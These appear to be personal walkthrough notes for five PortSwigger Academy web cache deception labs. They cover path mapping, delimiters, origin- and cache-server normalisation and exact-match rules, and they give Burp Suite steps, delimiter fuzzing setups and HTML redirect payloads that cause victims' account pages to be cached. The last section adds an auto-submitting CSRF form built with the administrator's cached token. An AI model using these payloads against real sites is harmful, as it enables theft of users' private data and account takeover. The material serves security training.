# Navigation
- [Exploiting path mapping for web cache deception](#exploiting-path-mapping-for-web-cache-deception)
- [Exploiting path delimiters for web cache deception](#exploiting-path-delimiters-for-web-cache-deception)
- [Exploiting origin server normalisation for web cache deception](#exploiting-origin-server-normalisation-for-web-cache-deception)
- [Exploiting cache server normalisation for web cache deception](#exploiting-cache-server-normalisation-for-web-cache-deception)
- [Exploiting exact-match cache rules for web cache deception](#exploiting-exact-match-cache-rules-for-web-cache-deception)
# Exploiting path mapping for web cache deception
- Find API key for user `carlos`
- Credentials: `wiener:peter`
1. Authenticate with credentials
2. Use [Web Cache Deception Scanner](https://portswigger.net/bappstore/7c1ca94a61474d9e897d307c858d52f0) on the `/my-account` page to scan for web cache misconfigurations
	1. Sitemap > `/my-account` > Right-click > Extensions > Web Cache Deception Scanner > Web Cache Deception Test
3. Scanner tells us there is a misconfiguration
4. Check the Logger tab and see that `.svg` extensions as well as others are being cached by the server
	1. We see `X-Cache: hit` when the exact same URL `/my-account/test.svg` is requested for the second time in the Logger tab
5. Construct a malicious HTTP site to make the victim visit their account page with a URL that will be cached
```html
<html>
<head></head>
<body>
<script type="text/javascript">
document.location = "https://0a960088041809d48282f61c0022001e.web-security-academy.net/my-account/pwn.svg";
</script>
</body>
</html>
```
6. Store > Deliver exploit to victim
7. In Repeater tab, navigate to `/my-account/pwn.svg`
8. We see we have a `X-Cache: hit` and that Carlos' API key is in the HTTP response
9. Submit solution
- **Note:** The same issue can be found using Burp scanner audit item "Web cache deception"
# Exploiting path delimiters for web cache deception
- Find API key for user `carlos`
- Credentials: `wiener:peter`
1. Authenticate with credentials
2. Send `/my-account` request to repeater
3. Submitting request returns account page
4. Add arbitrary string to URL `/my-accountaaa`
	1. Returns 404
5. Place delimiter in URL `/my-account;aaa`
	1. Returns 200 and our user information again
6. Place static file extension in URL `/my-account;aaa.js`
	1. Returns 200 and `X-Cache: miss` in response header
	2. Submit again
	3. Returns 200 and `X-Cache: hit` in response header
7. Exploit server > Create exploit body:
```html
<html>
<head></head>
<body>
<script type="text/javascript">
document.location = "https://0a0a004d034c2c0a81a37ac8004e00e9.web-security-academy.net/my-account;bbb.js";
</script>
</body>
</html>
```
8. Deliver exploit to victim
9. Navigate to cached URL `/my-account;bbb.js`
	1. `X-Cache: hit` is in response header and Carlos' API key
- **Note:** Burp scanner audit item "Web cache deception" detects this vulnerability as well
# Exploiting origin server normalisation for web cache deception
- Find API key for user `carlos`
- Credentials: `wiener:peter`
- List of possible delimiter characters to help you solve the lab: [Web cache deception lab delimiter list](https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list)
1. Authenticate to the target site
2. In Burp, crawl the target > Site map > Target > Scan > Crawl
3. In the `/my-account` page, change your email and send the request to repeater
4. Confirm there is URL normalisation performed by the origin server
	1. Submit `/aaa/..%2fmy-account/change-email` > Still receive 302 response
5. In the target site map see there is `/resources` directory > Send the `/resources/js/tracking.js` request to repeater tab
6. Change the request to `/resources/..%2fjs/tracking.js`
	1. Returns 404 and `X-Cache: miss`
	2. Submit request again and returns 404 and `X-Cache: hit`
7. Confirm `/resources/` is the static directory caching rule by submitting `/resources/aaa`
	1. Returns 404 and `X-Cache: miss`
	2. Submit request again and returns 404 and `X-Cache: hit`
8. We've confirmed the caching rule for static directories in `/resources`
9. Exploit server > Create exploit body:
```html
<html>
<head></head>
<body>
<script type="text/javascript">
document.location = "https://0a7300690469d27f80447b1e00d600dc.web-security-academy.net/resources/..%2fmy-account";
</script>
</body>
</html>
```
10. Deliver exploit to victim
11. Navigate to cached URL `/resources/..%2fmy-account`
	1. `X-Cache: hit` is in response header and Carlos' API key
# Exploiting cache server normalisation for web cache deception
- Find API key for user `carlos`
- Credentials: `wiener:peter`
- List of possible delimiter characters to help you solve the lab: [Web cache deception lab delimiter list](https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list)
1. Authenticate
2. Crawl the target site
3. `/resources` serves static content and has a cache rule matching the static directory
	1. Determined by submitting a request to `/resources/aaa` and still getting cached responses
4. Test a candidate payload that will exploit the cache normalisation (`/my-account%2f%2e%2e%2fresources`)
	1. 404 response but we get the response header `X-Cache:` indicating the response is cached by the server
5. Fuzz for a delimiter to truncate the request
6. Send request using payload from step 4 to intruder
- We need to make sure each request is unique when the cache interprets the request as to not hit the cache rule. We can do this by appending a random value to a random parameter at the end of the URL so the cache key is never the same
- Payload: `/my-account<payload_1>%2f%2e%2e%2fresources?foo=<payload_2>`
	1. Attack type: Pitchfork
	2. Payload 1: Web cache delimiter wordlist
	3. Payload 2: Numbers 0 - 66
	4. Disable URL-encoding
	5. Start attack
- Notice that URL encoded `#` returns the `/my-account` endpoint and the response is cached
1. Construct malicious HTML document on exploit server using the URL encoded `#`
```html
<html>
<head></head>
<body>
<script type="text/javascript">
document.location = "https://0a7c003f034e0baf85efc7480068006e.web-security-academy.net/my-account%23%2f%2e%2e%2fresources?foo=34";
</script>
</body>
</html>
```
2. Send payload to target
3. Navigate to the URL `/my-account%23%2f%2e%2e%2fresources?foo=34`
	1. 200 response and we see `X-Cache: hit` in the HTTP response headers along with Carlos' API key
# Exploiting exact-match cache rules for web cache deception
- Change the email address of `administrator`
- Use the credentials `wiener:peter`
- Use PortSwigger's delimiter list
1. Authenticate
2. Param Miner > Settings > Enable "Add dynamic cachebuster"
3. View `/my-account` page and see that there is a CSRF token in the HTTP response which is part of the `change-email` function
4. Make a `GET` request on the web root for `robots.txt` and see that we get `X-Cache: miss` in the HTTP response header, this indicates the cache server is caching `robots.txt`
5. Test for a discrepancy between the cache server and the origin server using a URL-encoded dot-segment request - `/my-account%2f%2e%2e%2frobots.txt`
	- 404 received and `X-Cache: miss` returned in HTTP response. This indicates the origin server did not resolve the dot-segment while the cache server did
6. Fuzz for a delimiter using Intruder
	1. Use the following fuzz payload `/my-account<delim>%2f%2e%2e%2frobots.txt?foo=<bar>`
	2. Attack type: Pitchfork
	3. `<delim>`: Delimiter wordlist (Disable payload encoding)
	4. `bar`: Numbers (0-66)
7. Start Attack
8. Identify `;` as a valid delimiter. We see our profile page and the response is cached
9. Go to exploit server
10. Craft a malicious page
```html
<html>
<head></head>
<body>
<script type="text/javascript">
document.location = "https://0af8009503ce14d482d7475f00ac004e.web-security-academy.net/my-account;%2f%2e%2e%2frobots.txt?foo=aaa";
</script>
</body>
</html>
```
11. Store exploit
12. Deliver exploit to victim
13. Param Miner > Settings > Disable "Add dynamic cachebuster"
14. Make request in repeater to the cached URL `/my-account;%2f%2e%2e%2frobots.txt?foo=aaa` - **Note:** You have 30 seconds from when you delivered the exploit
	1. Receive `X-Cache: hit` and see the administrator's page as well as their CSRF token in the email change field. Save the CSRF token value
15. Go to exploit server
16. Craft a malicious page that will deliver a CSRF attack
```html
<html>
	<body>
		<form action="https://0af8009503ce14d482d7475f00ac004e.web-security-academy.net/my-account/change-email" method="POST">
			<input type="hidden" name="email" value="owned@evil.net" />
			<input type="hidden" name="csrf" value="ADH8JWDXOoLbqvF37OmcI0nfKZEb00oM" />
		</form>
		<script>
			document.forms[0].submit();
		</script>
	<body>
</html>
```
- In the wiener account, change the email to get the right information needed for the request
- Use the CSRF token from the administrator's cached page
17. Store exploit
18. Deliver exploit to victim